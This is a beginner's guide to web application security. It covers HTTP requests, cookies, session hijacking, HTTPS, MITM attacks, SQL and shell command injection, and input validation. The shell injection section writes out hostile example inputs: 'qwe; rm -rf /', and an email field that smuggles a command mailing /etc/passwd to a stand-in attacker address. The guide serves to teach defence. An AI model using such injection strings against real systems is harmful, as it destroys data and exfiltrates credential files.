# Web Application Security Guide

Web Applications are currently the predominant source of software vulnerabilities exploited in online attacks.Quantity and importance of data entrusted to web applications is growing, and defenders need to learn how to secure them. Traditional network defences, such as firewalls, fail to secure web applications. There is a growing need and demand for web programmers to be security literate. </br>

In this guide you will learn to understand potential risks when creating a web apllication. You will also be able to reconize vulnerabilities and in that way learn how to defend your own applications from those vurnerabilities. In this guide the following subjects will be discussed: </br>
- Understand common mistakes of coders and vulnerabilities of web applications.
- Understand web application security and its importance.
- Explains how code developers’ mistakes may be exploited to the benefit of the attackers and how to prevent these attacks.
- Build secure web applications using secure coding practices.
- HTTP
- GET/POST REQUESTS
- GET REQUESTS
- POST REQUESTS
- SECURITY CONCERNS : GET/POST REQUESTS
- REFERER HEADER
- SECURITY CONCERNS : REFERER HEADER
- CACHING
- SECURITY CONCERNS : CACHING
- COOKIES
- SECURITY CONCERN: COOKIES
- SESSIONS
- SESSION HIJACKING
- PREVENT SESSION HIJACKING
- HTTPS
- PACKET SNIFFING
- PREVENT PACKET SNIFFING
- MITM (MAN IN THE MIDDLE ATTACK)
- PREVENT MITM ATTACKS
- CBM (CERTIFICATE BASES MUTUAL) AUTHENTICATION
- SECURITY LAB 1
- PASSING DATA IN SUBSYSTEMS
- INTRODUCTION 
- METACHARACTERS
- SECURITY CONCERNS: PASSING DATA IN SUBSYSTEMS
- SQL INJECTIONS
- PREVENT SQL INJECTION
- SHELL COMMAND INJECTIONS
- PREVENT SQL INJECTIONS
- USER INPUT
- INTRODUCTION
- INPUT
- SECURITY CONCERNS: INPUT
- VALIDATING INPUT

Tools used in this guide </br>
- VirtualBox, This tool is used to setup a secure test inveronment
- Postman, This tool is used for performing intergration testing with your API.

There are three specifications that are central to the web:</br>
- URL (Uniform Recourse Locators)
- HTML (HyperText Markup Language)
- HTTP (HyperText Tranfer Protocol)
 

## HTTP</br>
In the image below you can see a represantation of how you computer connects to a server.</br>
![client-server](https://user-images.githubusercontent.com/24454699/56094773-b2a16280-5ec5-11e9-8373-ca946d15258f.png)
</br>
A TCP connection is created, then the browser sends a HTTP request to the server asking for the wanted document. The webserver than replies with the page content and the closes the TCP connection again.

The browser is always the initiating party and the server nervel calls back. This means that HTTP is a client/server protocol. The client in this case doesn't always have to be a browser. It can also be your typical instagram application.

The HTTP is line oriented which means that the communication takes place using strings of characters which are separated by carriage return (ASCII 13) and line feded (ASCII 10).

## GET/POST REQUESTS 
There are 2 different types of requests that can be send by the client.
### GET REQUESTS
  In this request the client asks for information. With the GET request the browser is free to resent the request, for example, this happends when the user presses the back button on a website. (this is not suitable with for example, money transfers because this will resend the transfer each time the back button is pressed) In a GET request the parameters of the request are encoded in the URL. In the image below you can find an example of the GET request. </br>

  ![get_req](https://user-images.githubusercontent.com/24454699/56095124-1ed19580-5ec9-11e9-9224-5692be6ffa91.png)
</br>

  The following can be said about this image: 
  - The first line shows the Request-line. In the request-lin the GET is called the method token. The HTTP is the request URI and the 1.0 is the HTTP-version identifier.
  - The lines below the request-line are the Request-header lines.
  
  After the GET request is send by the client the server will send back a responce. (see image below)</br>
  ![responce_get](https://user-images.githubusercontent.com/24454699/56095184-b800ac00-5ec9-11e9-91e1-076b6c2b2eb6.png)
  </br>

  The following can be said about the image above:
  - The first line is called the status line. The HTTP/1.1 is called the HTTP-version, the 200 OK is called the status code. In this case the status code is 200 which means the request is OK. Another status code which we all reconize is status code 404 NOT FOUND which means that the requested webpage is not found.
  - The lines after the status lines (encirkeld in red) are calle the Request-header lines. In these lines you can find the content length. The value (in this case 84) represents the amount of bytes that are in the requested content.
  - The lines below that (encirkeld in blue) is the content that is requested. This is written in HTML.

### POST  REQUESTS
In this request the clients sends information that changes the information currently on the server. This request cannot be resend by the client without it asking permission for it.  The parameters of a POST request are hidden.  In the image below you can find an example of a POST request. </br>
![post_req](https://user-images.githubusercontent.com/24454699/56095517-5fcba900-5ecd-11e9-8fe6-4c2608f5174f.png)
</br>

It's basicly the same as a GET request only in this case the method token is POST. You can also see that the content-type is an encoded form. The content-lenght is again the amoubtn of bytes posted by the request. In this case a user tries to login using the username jdoe and the password BritneySpears. This can be seen in the last line.</br>

URL encoding means that you change certain characters found in the URL by encoding them using a % sign followed by tho hexadecimal digits. (see image below)</br>

![encoded](https://user-images.githubusercontent.com/24454699/56095603-0617ae80-5ece-11e9-8e11-f91f98a9946d.png)
</br>

### SECURITY CONCERNS: GET/POST REQUESTS
The origin of all the requests are on the side of the client. This means that an attacker can replace the client (EX. a browser) with something completely different. For example a proxy can be used to manipulate the data sent to the server. They sit between your client (ex. your browser ) and the server. The proxy lets the attacker change the header and data before passing it to the server.</br>
A situation where this could be usefull for an attacker: </br>
A user want so send money via a bank transfer. The user wants to send the money to an account with the number 1234. The attacker changes this account number to his own account number, 4321. When the user presses send  the money will be send to account 4321 instead of account 1234.  

## REFERER HEADER 
On a request the referer header contains the url  of the website  where the document is located. This is also the case when you have an image on your website that is from another website. (in the image below you can see an example of this) </br>
![urlheader](https://user-images.githubusercontent.com/24454699/56095993-ebdfcf80-5ed1-11e9-942d-b6e8ec2b6705.png)
</br>
In the image above the the image used is from the website : http://www.site.example/index.html. This meanse that you use a snippit (small part) of the html code from that website. It's the same for the link below the image. 

### SECURITY CONCERN: REFERER HEADER
Because a part of the code,  from the website that has the image on it,  is used in your own website, it will  also use any JavaApplets, ActiveX scripts and plug-ins included in that  page.

## CACHING
The term Caching refers to temporarily storing documents on the client or server side to reduce the download time. When we talk about caching you can devide it in two types of chaches:
- Local cache </br>
  This is manged by the client (your browser). When the client sends a request for a type of document it saves the document on your disk. When you go to the document (the page in this case) again the loading time will be much lower because it can get the document from your local storage instead of a remote server.
- Shared cache </br>
   This cache is typically a server in the local network. If one user reads an online newspaper, and another user tries to access the same newspaper the second user will get a local copy because it was already requested by the first user.  </br>

   The image below shows the 2 types of caches: </br>

![clientservercache](https://user-images.githubusercontent.com/24454699/56096371-c30e0900-5ed6-11e9-87aa-d1db6e25261c.png)
</br>

### SECURITY CONCERN: CACHING
Some documents should not be cached. A few examples of those documents are:
- The stock information on a webstore. The user should always be served up to date stock information. If the information from the day before is cached and then retrieved by an user there is a possiblity the user recieves out of date stock information.
- Another situation could be in an internet cafe. If user 1 has send information on a banking website and leaves, then user 2 goes to the computer that was just used by user 1 and then presses the backbutton, user 2 will be able to retrieve the banking info of user .

The sites need a way to tell the browser and proxies to not save these kind of documents. This is done in the HTTP headers. Different versions of HTTP apply different mechanisms for cache control. This means that an older version of HTTP could also be a security consern.

## COOKIES
HTTP is a stateless protocol. This means that there are no connections to previous request made by the same client. To create a connection (state) between these requests we make use of cookies. Cookies are an extension of HTTP to give us just the state, So with cookies the webserver asks the client to remember a small piece of information. This info is passed back by the client on each request to the same server.</br>

An example of a cookie is: On google search the user can set the amount of results returned by a google search. The cookie makes sure the amount set by the user is remember each time the user does a search on google.</br>

The HTTP header is used for both setting and returning the cookies. When the server want the client to remember a cookie it passes a Set-Cookie Header in the response. The image below is an example of a Set-Cookie Header. </br>

![set_cookie_header](https://user-images.githubusercontent.com/24454699/56096540-14b79300-5ed9-11e9-8a07-1c79ca99142e.png)
</br>

The cookie is then returned using something called the cookie header. (see image below)</br>

![cookieheader](https://user-images.githubusercontent.com/24454699/56096566-7415a300-5ed9-11e9-8cfd-22d7d749cfac.png)
</br>

### SECURITY CONCERN: COOKIES
Using cookies comes in very handy. There are some security concerns it brings with them. The concerns are as follows:
- Cookies may be limited in size, this means that space consuming states cannot be safely represented using cookies.
- Cookies are handled on the client-side, as we know right know client-side stuff can be manipulated by users with bad intentions. 

Solving these concerns can be done by storing the cookie information on the server side.

## SESSIONS
Session are a collection of variables that make up a state. They are located on the server-side. To make sure the session is associated with the correct client a session ID is passed on each request to the server. So the session ID uniquely identifies with one session object on the server. </br>
The image below shows a visual represantation of a session object. </br>

![SessionID](https://user-images.githubusercontent.com/24454699/56096940-cb1d7700-5edd-11e9-927f-71faa21290d6.png)
</br>

### SESSION HIJACKING
These days a lot of websites use session based login. This means a session is initiated when the user has given a valid username and password. But what if someone gets access to the session ID of the user thats logged in? </br>
In this case the attacker would not need the password of the victim since the session ID works as a temporarily replacement for the password.  There are multiple ways an attacker can get access of the SessionID :
- Guess it
- Calculate it
- Brute-force it
- Trial and error search
- Cross site scripting
- Use referer header
- Packet sniffing
The list goes on and on

### PREVENT SESSION HIJACKING
As mentioned above there are a lot of ways an attacker can find the sessionID. To prevent this from happening you need to improve the secrecy of the SessionID. The key to preventing your sessionID from being stolen is making it unavailable to third parties. A lot of websites use secondary measures to prevent session hijacking even after the sessionID is compromised.</br>
CAUTION : none of these secondary measures offer full protection to session hijacking, the secrecy of the sessionID is the only real mechanism for protection.

### SECONDARY MEASURES FOR PREVENTING SESSION HIJACKING
There are multiple secondary measures that can be taken to prevent session hijacking:
- Tie the sessionID to the IP address of the client. </br>
  This measure wont protect you from attackers that use the same IP address. For example when using a VPN you have the same IP addres as other users that use the same VPN.
- Tie the sessionID to certain HTTP Headers passed by the client.  </br>
   This is also not bullet proof since the attacker can replicate the HTTP headers your client sends.
- Have variable sessionID's </br>
   If you make sure the sessionID changes with every request made by the client it's harder for the attacker to hijack the session. Unfortunatly this is also not secure enough since it can take a while for a user to send a new request. In the time before a new request an attacker could have already taken over the whole session blocking the victim of further access.

 ![sessionwarning](https://user-images.githubusercontent.com/24454699/56097146-1e90c480-5ee0-11e9-9abf-e955eb4f09b4.png)
   </br>

## HTTPS
In the procces of making a web server secure, encryption plays an important role. In a web setting, encryption usually means HTTPS.  This means that all the HTTP  communication is done over an encrypted channel. To check if a webserver usses encryption you can either:
- Check the url. If we take githubs website for example you will see that the url looks like this :  https://github.com/PieterLems/.  As you can see, in front of the github.com there is HTTPS, which meanse the webserver usses encryption.
- Another way to check this, is to check the logo in front of your URL bar of your browser. As you can see in the image there is a shield in front of the URL bar. This means that the webserver usses encryption.

  ![githubsecure](https://user-images.githubusercontent.com/24454699/56097236-1be29f00-5ee1-11e9-8163-fc7901236364.png)
</br>

The encrypted channel can be provided by the following protocols:
- Secure Socket Layer (SSL)
- Transport Layer Security (TLS)

CAUTION: The encryption protocols only protect the connection between the client and server. The attacker can still attack both the client and the server, but he will have a hard time attaking the communication between those two. </br>
The image below is a visual represantation of the difference between a HTTP (on top of the image) and a HTTPS (at the bottom of the image) connection.

![secureinconnection](https://user-images.githubusercontent.com/24454699/56097339-36694800-5ee2-11e9-96c4-7ad2aa4ddd8d.png)
</br>

### PACKET SNIFFING
Packet sniffing is a way to attach the networking transport rather than the client. First you need to understand what a packet is. A packet is a unit of data made into a single package that travels along a given network path. Data packets are used in Internet Protocol (IP) transmissions for data that navigates the Web, and in other kinds of networks. </br>
The image below shows a visual represantation of an attacker sniffing packets transfered by the victim.

![packetsnif](https://user-images.githubusercontent.com/24454699/56097386-d030f500-5ee2-11e9-89be-a0202b1e4bba.png)
</br>

### PREVENT PACKET SNIFFING
To prevent data being stolen when your packets are being sniffed you should make use of encrypted connections (HTTPS).  This won't prevent the attacker from sniffing your packets but all the content of the sniffed packets are random strings of data.</br>
A visual represantation of what happends when packets are being sniffed over an insecure (at the top of the image) and  a secure (at the bottom of the image) connection is shown in the image below.

![securesnif](https://user-images.githubusercontent.com/24454699/56097452-be038680-5ee3-11e9-8158-87e723a7fc4d.png)
</br>

### MITM (MAN IN THE MIDDLE ATTACK)
In a MITM attack the attacker tricks the victim's computer into connection to the computer of the attacker rather than connecting it to the real server.</br>
Take for example a situation where a user connects to a bank server:
- The attacker tricks the user's computer in thinking that the attackers computer is the bank's server.
- The attacker than forwards all the communication to the banks server. 
- From the victim's point it looks like he's connected to the bank server but in reality all the communication is send trought the attackers computer.
- This enables the attacker to intercept, read and modify all the communication made between the 2 parties. (bank and victim)

A visual represantation of a MITM attack is shown in the image below:

![mitm](https://user-images.githubusercontent.com/24454699/56097508-bb556100-5ee4-11e9-8524-a7bdd3e27197.png)
</br>

### PREVENT MITM ATTACKS / CBM (CERTIFICATE BASES MUTUAL) AUTHENTICATION
When you make use of a HTTPS connecting the client always verifies something called the server's certificate. This certificate is an unique identifier of the webserver. </br>
The image below shows a certificate</br>

![certificate](https://user-images.githubusercontent.com/24454699/56097648-cf01c700-5ee6-11e9-867d-5a570fc18c93.png)
</br>

The image below is a visual represantation of how the servers certificate is verified. <br>

![certificateverify](https://user-images.githubusercontent.com/24454699/56097685-551e0d80-5ee7-11e9-9951-498b35ffba70.png)
</br>

HTTPS doesn't always prevent the attacker from succeding when performing a MITM attack, this can be caused by a few factors:
- Ignorant users, the user neglects the warnings given by the browser.
- The browser doenst give out any warnings.
- The user falls for cheap domain name or protocol tricks used by the attacker. 
- Fake websites with similar domains. (the html of a website can be easily replicated by the attacker and the domain name can be spoofed in something that looks like the domain the victim tries to access)
- Certification authorities mistakes, the CA may be tricked into giving out false certificates.
- The browser trusts a CA (certificate authoritie) that isn't trusted by the user.
- Bugs in the browser, the browser has a buggy SSL/TLS implentation.
- The user's computer is compromised by the attacker.

## SECURITY LAB 1

## PASSING DATA IN SUBSYSTEMS
When using dynamic webapplications data is passed to one ore more subsystems. A few examples of this subsystems are:
- SQL databases
- Operating Systems
- Libraries
- Shell command interpreters
- Xpath handlers
- XML documents
- Legacy Systems
- User's browser

The way the communication between the application and the subsystems takes place is by building strings containing control information and data. But what data is passed?
The subsystems contain parser which decode incoming strings character by character, and then decides what to do based on what they read. The strings could represent names, addresses, passwords, webpage's ... just about everything. </br>
A visual representation of this can be found in the image below. </br>

![commsub](https://user-images.githubusercontent.com/24454699/56097894-a5966a80-5ee9-11e9-8a00-488f899f5193.png)
</br>

### METACHARACTERS
When we use special characters as input those characters won't be treated the same. There is a possiblity the system reads this character as a metacharachter. </br>
These characters won't always be treated asa plain text. They can become control characters. metacharachters are not a threat by themselves. </br>

### SECURITY CONCERNS: PASSING DATA IN SUBSYSTEMS
They become a threat when developers think they are passing them as pure data but that data makes the subsystem do something unexpected.</br>
If the subsystem reads a metacharachter it may stop reading pure data and start reading commands entered by the attacker.

## SQL INJECTIONS
One of these attacks where an attacker makes use of metacharachters is called a sql injection. We all know the syntax of SQL and we also know that metacharachters are involved in writing queries. </br>
In SQL Injections,an attacker is able to modify or add queries that are sent to a database by playing with input to the webapplication. The attack works when a program builds queries based on strings from the client, and passes them to the database server without handling characters that have special meaning to the server / subsystem. </br>
In the image below you can find a visual represantation of a SQL injection. </br>

![sqlinj](https://user-images.githubusercontent.com/24454699/56126074-dc13ca00-5f69-11e9-8437-49b43692d776.png)
</br>

Below we will describe an example of a sql injection</br>
In this example we will use a situation where a user want to register to a website that uses a SQL database as backend. The java code in the application is as follows: </br>

![sqlinjec1](https://user-images.githubusercontent.com/24454699/56126291-5b090280-5f6a-11e9-87fe-4553300e230c.png)
</br>

Then there are 2 uses that want to register. The first user is : </br>

![sql1](https://user-images.githubusercontent.com/24454699/56126343-7d028500-5f6a-11e9-9c20-8fb914c8124b.png)
</br>

And the second user : </br>

![sql2](https://user-images.githubusercontent.com/24454699/56126413-a8856f80-5f6a-11e9-89c6-ca793f076210.png)
</br>

In the picture above the character encirkeld in red is the metacharachter that makes the system do something unexpected. Take for example a login form in a web application which uses the following code to check the input credentials. (image below) </br>

![sqlattack](https://user-images.githubusercontent.com/24454699/56126784-39f4e180-5f6b-11e9-9933-e6ba9b639a0c.png)
</br>

If the attacker happends to know that there is a user named john', he fills in john' as user name. This will cause the system to fill in the sql query as follows : </br>


![sqlattack2](https://user-images.githubusercontent.com/24454699/56128614-b38ece80-5f6f-11e9-8a4d-097af70285ee.png)
</br>

Now the attacker is logged in as user john' without needing his password. The reason for this is because the metacharachter (' in this case), disables the test for matching the password.
### PREVENT SQL INJECTION
So what is the problem in the example above? The problem is not the metacharachter, its all about contexts and parsing. In the image below everthing is OK up to the first singel quote, because it switches to parsing a string constant. </br>

![stringconstant](https://user-images.githubusercontent.com/24454699/56128398-061bbb00-5f6f-11e9-8e18-06f3a34fdcd2.png)
</br>

The real problem is: The attacker is allowed to make the SQL parser switch context. (reading plain text to inserting queries).

Again, metacharachters are not the problem. The way the SQL parser reads them is. To fix this we can do 2 things:
- Neutralize SQL metacharachters. (make them lose their meaning)</br>
  To do this you first need to read the database server documentation to see what characters need special treatment. The reason for this is because some databases add their own non-standard metacharachters. To Neutralize the metacharachter we need to "escape" them by duplicating the character. </br>
  For example:
  - In PostgreSQL and MySQL, string constants may contain backslash escape (/) sequences like in C and Java.</br>
  Lets take the example in the image below. </br>

  ![sqlattack3](https://user-images.githubusercontent.com/24454699/56129775-93acda00-5f72-11e9-853d-7e968db50c77.png)
  </br>
  Here the code accepts a username from a form, and looks up the matching user in the database. The username is read from the POSTed data. </br>
  Then every quote character is escaped by doubling the character so the sql parser reads it as: (see image below)</br>
  ![sqlinput](https://user-images.githubusercontent.com/24454699/56129956-251c4c00-5f73-11e9-8677-b9a28cc57a0e.png)
</br>
  which is a SQL string constant. </br>
  Then it's included in the query.

  It's more secure this way but it's not bullet proof. (see image below) </br>

  ![attackclever](https://user-images.githubusercontent.com/24454699/56130034-59900800-5f73-11e9-9f77-c70ab8eef0fc.png)
  </br>

  The database did not do anything to the backslash (/), it only doubled the singel quote ('). Now we are back to the start and all the users are deleted in this case.</br>
  To solve this we can apply the following sollution to the code. (see image below) </br>

  ![solution2](https://user-images.githubusercontent.com/24454699/56130441-66612b80-5f74-11e9-828a-26cd356698c4.png)
  </br>
  Here you can see that the backslash (/) is also escaped by doubling it. (//) </br>
  The problem with this solution is that you have to repeat this for every metacharachter that has a special meaning in the database server.
- Another solution is using prepared statements where no metacharachters are used.  </br>
  In this solutiong we dont handle the metacharachters ourselves but we make use of prepared statements. In this method query paramaters are passed separately from the SQL statement. In this way there are no metacharachters. (see image below)</br>

  ![solution3](https://user-images.githubusercontent.com/24454699/56130628-f43d1680-5f74-11e9-875d-7a3417690fc8.png)
  </br>
  The benefits of this method are as follows:
  - We dont need to remember all that metacharachter handling.
  - prepared statements execute faster than plain statements becuase they get parsed only once by the database server.

## SHELL COMMAND INJECTIONS
Programs writing in web programming Languages,often rely on running external commands to perform tasks. When such a program runs an external command the interpreter will leave the program which runs and executes a command on the operating systems shell. (examples of operating shells are :sh,bash,csh,tshc). </br>
Shell understand a large set of metacharachters, and as we know this causes major security problems. Some security problems are:
- Command substitution </br>
  In the image below we execute a shell command that checks if somebody is logged in to one of the machines at for example an university.</br>
  
  ![attackshelsub](https://user-images.githubusercontent.com/24454699/56131343-af19e400-5f76-11e9-9783-25e1b8b6f62d.png)
  In the script we make use of the command finger which returns the necessary information. </br>
  If we use the line qwe; rm -rf / as input for the username the final command will become (see image below) </br>

  ![fingercommmand](https://user-images.githubusercontent.com/24454699/56131489-19328900-5f77-11e9-8acc-294f23ff62d7.png)
  </br>

  This will run a command that deletes the whole file system!
- Piping the commands </br>
  In an UNIX based operating system there is a file called /etc/passwd. This file contains information on all users on the system, including a hashed represantation of their passwords. </br>
  Take an example where a script sends a E-mail to a user. The email service called sendmail sends the email by piping the contents of the mail trough the program. In the script, a recipient address is required. (see image below)</br>
 
  ![sendmail](https://user-images.githubusercontent.com/24454699/56131922-4af81f80-5f78-11e9-8274-776fb9332987.png)
  </br>
  If an attacker registers an email adress like this : foo@bar.example; mail badguy@badguy.example < /etc/passwd it will include it as statement in the executed command. (see image below)</br>

  ![sendmailshellattack](https://user-images.githubusercontent.com/24454699/56132116-b2ae6a80-5f78-11e9-985a-754b5ce63ae4.png)
  </br>

### PREVENT SHELL COMMAND INJECTIONS
There are certain steps that need to be taken to prevent a shell command injection from happening: 
- Identify when the shell is being used.
  First you have to Identify the functions in your programming Language that pass data to a command shell, or the ways to invoke it. some examples of these functions are shown in the image below. </br>

  ![commandexample](https://user-images.githubusercontent.com/24454699/56132467-93640d00-5f79-11e9-9a36-d0ce2c7143e4.png)
  </br>

- Handling and disarming the shell metacharachters.
  Each shell has different metacharachters and how they are used differs aswell. Take for example the metacharachters in BASH ( Bourne Again Shell). see image below </br>

  ![metabash](https://user-images.githubusercontent.com/24454699/56132580-e047e380-5f79-11e9-86f1-cd0764a1ce34.png)
  </br>

  You could solve the problem in the same way as we did with the SQL Injections, by escaping the metacharachters. (recap that if needed)</br>
  Altough the principle of escaping metacharachter is the same it's done in a different way.
  - singel quote encapsulation makes sure the shell treats the text as just plain text. If the data contains singel quotes, we can still use single wqoute encapsulation if we split the string on all the single quotes and glue quoted strings togheter using a backslash-escaped single quote. see image below </br>
  
  ![doublyquoteshell](https://user-images.githubusercontent.com/24454699/56137164-bd223180-5f83-11e9-839e-d01cd7419526.png)
  </br>

  - Double quote encapsulation , when using double quote encapsulation all characters except the following lose their special meaning;
    - $
    - ` (backtick)
    - "
    - \
  These characters need to be escaped using a backslash /

  - The last solution is to escape every metacharachter by setting a backslash infront of them.
  Escaping metacharachters is hard because we are not always sure what kind of shell is being used.
  
- Avoiding user input in the command arguments.
  If we could avoid passing user data on the command line, it becomes a lot simpler to prevent shell command Injections. </br>
  Some programs are forced to read data from files or from the input stream.  Take the image below as an example </br>

  ![nouserinput](https://user-images.githubusercontent.com/24454699/56138751-0627b500-5f87-11e9-8092-93c4961c746d.png)
  </br>

  You cold solve this by using the -t option in sendmail. The option makes sure the recipient address is taken from the mail headers. see image below </br>

  ![sendmailheader](https://user-images.githubusercontent.com/24454699/56138917-5dc62080-5f87-11e9-98bb-461d5f0c0727.png)
  </br>
- Managing without the shell. (not making use of the shell) 
  Why should we use the shell at all? All the features provided by the shell can be programmed into your application. Take for example the sendmail program, Someone that knows how STMP (Simpel Mail Transfer Protocol) works should be able to write the required code.

## USER INPUT
Most webapplications accept input from the client. The input could decide what to do next, be stored somewhere, be included in the webpage, emailed to someone.
As mentioned above accepting wrong input may result in the program making wrong decisions. To make sure our application doenst accept wrong input me should use input validation.

## INPUT
URL paramaters are considered as input. see image below </br>

![urlinput](https://user-images.githubusercontent.com/24454699/56139692-e5605f00-5f88-11e9-8b3d-c68e9d06bf5b.png)
</br>

Text fields and Text areas are also a form of input. This can be seen in GET and POST requests. see image below </br>

![postinput](https://user-images.githubusercontent.com/24454699/56139821-2789a080-5f89-11e9-9aa1-0e4f693dd6d3.png)
</br>

These types of inputs are know as user-generated input.

Other kinds of input are considered as not "real" by quite a few developers since they are predefined values. (a list of input values dictated by the application instead of the user) see images below. </br>

![unreal1](https://user-images.githubusercontent.com/24454699/56140015-8c44fb00-5f89-11e9-9d22-0d889b97bc6f.png)

![unreal2](https://user-images.githubusercontent.com/24454699/56140037-9961ea00-5f89-11e9-9c10-3aa9ee74ef04.png)

The following types of inputs are predefined:
- checkboxes
- hidden fields
- dropdown

These inputs can be called server-generated input, even if they come from the client, as the values are dictated by our application. The UI doenst give the user the option to change these values.

### SECURITY CONCERNS: INPUT
It may seem it's secure to use predefined input values, but its not that secure since the attacker can modify the values before they even reach the victim. </br>
For example (see image below) </br>


![predefinedinput](https://user-images.githubusercontent.com/24454699/56140443-75eb6f00-5f8a-11e9-9297-97eda6f8891a.png)
</br>

Modifying the HTML can be done by reproducing the following steps:
- Use the browser to save the HTML to a file
- Open the file in a text editor
- Make the intended changes
- If the action attribute of the form is relative, modify it to contain a full URL
- Save the file
- Open the local file in the browser and submit the form

Some web applications dont pay attention to the difference between a POST and a GET request and accept either of the two. see image below for the differences. </br>
![differencepostget](https://user-images.githubusercontent.com/24454699/56150470-873e7680-5f9e-11e9-9a79-6d18d3388eda.png)
</br>

If this is the case the attacker probably doenst even have to go trough the trouble of Modifying the HTML, he will just pick the paramaters from the form and appends them to the URL given in the action attribute, and puts the resulting URL in the URL bar.


### SERVER GENERATED FIELDS
Nothing stops the attacker from making variables/inputs (ex. country, gender and userid) any value he wants them to be. This means the predefined inputs we saw earlier (checkboxes, hidden fields, dropdown), are just as much of an input as the user generated fields. Even HTTP header, including cookies should be treated as textual input. This will be shown in the example below.</br>

In this example we will use international documents for an online payment. </br>
The payment file is located at the filelocation shown in the image below. </br>

![paymentdocument](https://user-images.githubusercontent.com/24454699/56151015-ca4d1980-5f9f-11e9-86ef-a12ebd3c54eb.png)
</br>

The IT, encirkeld in red, represents the Language (italian) the victim uses. If the user would like to view the payment documentation he will follow a link to a URL which looks like the URL shown in the image below.</br>

![doclink](https://user-images.githubusercontent.com/24454699/56151182-39c30900-5fa0-11e9-8b52-0b7a908ea8ee.png)
</br>

The banking software would determine what Language the victim uses based on the local settings (remember the encirkeld IT), and then read the payment file from the correct directory. How this is done is displayed in the image below.</br>

![HTTPheadbank](https://user-images.githubusercontent.com/24454699/56151451-c8378a80-5fa0-11e9-80e0-b1ddf961496f.png)
</br>

The language string is taken from the accept-language HTTP headerm which comes from the client's request. see image below. </br>

![clientrequestheader](https://user-images.githubusercontent.com/24454699/56151641-38461080-5fa1-11e9-8ece-d58156bc5230.png)'
</br>
 
 BUT what if the attackers would change the following lines? see image below </br>

 ![wrongline](https://user-images.githubusercontent.com/24454699/56151731-7ba07f00-5fa1-11e9-9251-f89ee921cc5f.png)
 </br>

 Well in this case the web application will respond with the file mentionend earlier in this guide, /etc/passwd. (the file that includded hashed passwords)

 so lets recap the definition of INPUT: </br>

![recapinput](https://user-images.githubusercontent.com/24454699/56151896-d6d27180-5fa1-11e9-9502-41ba485f50e3.png)
</br>

## VALIDATING INPUT
Input validation is the process of determining whether an input paramater is valid, according to the rules that we set in our application.
Take for example an input field where the user has to enter his email address. When validating the input given by the user we check that the format of the input matches the format of an email address. see image below </br>

![emailformat](https://user-images.githubusercontent.com/24454699/56152384-0c2b8f00-5fa3-11e9-956e-30b4b65656fe.png)
</br>

We call formats like an email format DOMAIN TYPES. More domain types could be:
- Account
- Country code
- Costumer ID
- Date
- File name
- Payment amount
- Phone number
- URL
- VISA card number

Take for example the VISA card number format. The input validation would look something like in the image below. </br>

![validatevisa](https://user-images.githubusercontent.com/24454699/56152850-52cdb900-5fa4-11e9-8a39-346bd5af54d6.png)
</br>


The main goal of input validation is that we dont have to avoid metacharachters like in SQL Injections and Cross site scripting but that our application works with data that has the expected format. (recap SQL injections if needed Cross site scripting will be explained later in this guide). </br>
The reason for not avoiding metacharachters, is because we somethimes need them. For example in the name O'Conner and when < or > signs are needed on a math discussion forum.

But what is the best way to perform validation input...? There are multiple steps you can follow to perform input validation:
- First Identify All the input on your webapplication. Make sure to inlcude, hidden fields, option values, cookies and other stuff comming from HTTP headers.
- Create validation functions, Ex. isValidEmailAddress, isValidCostumerID that return boolean values (true or false). In the case of a server-generated input, parallel function should be used, Ex. assertValidEmailAddress and asserValidCostumerID to make sure that the execution is aborted if the input is invalid. Two examples of functions that validate inputs can be found below. </br>

![validateex1](https://user-images.githubusercontent.com/24454699/56155830-587acd00-5fab-11e9-99ea-37ef8b7d3a09.png)
</br>

![validateex2](https://user-images.githubusercontent.com/24454699/56155860-6892ac80-5fab-11e9-89cc-4e6f8964486b.png)
</brr>


- Check the range of an input. For example when there is an input field for the amount of items in a webstore. This should be numeric but not negative. 
- Check the lenght of an input. This could be usefull when you have a domain type like VISA card number. This input should always have a set range because the lenght of a VISA card number doesn't differ. The lenght of an input can also be set in a database table by specifying an upper lenght limit for the input field.
- Check for precense of NULL-Bytes
- Perform the input validation before doing anything else.
- Perform autherization tests
- Automate input validation 

### REGULAR EXSPRESSIONS 
The art of checking known input EX. email 

examples of input functions 
 